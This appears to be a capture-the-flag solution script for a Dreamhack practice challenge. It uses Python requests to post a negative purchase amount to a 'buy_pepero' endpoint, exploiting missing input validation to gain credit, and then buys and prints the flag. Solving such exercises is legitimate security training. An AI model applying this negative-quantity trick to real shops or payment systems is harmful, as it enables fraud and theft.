import requests

url_main = "http://host3.dreamhack.games:17544/"
url_pepero = "http://host3.dreamhack.games:17544/buy_pepero"
url_flag = "http://host3.dreamhack.games:17544/buy_flag"

session = requests.Session()

session.get(url_main)

response = session.post(url_pepero, data={'amount': -10})

response = session.post(url_flag)

print(response.text)

print(response.text)
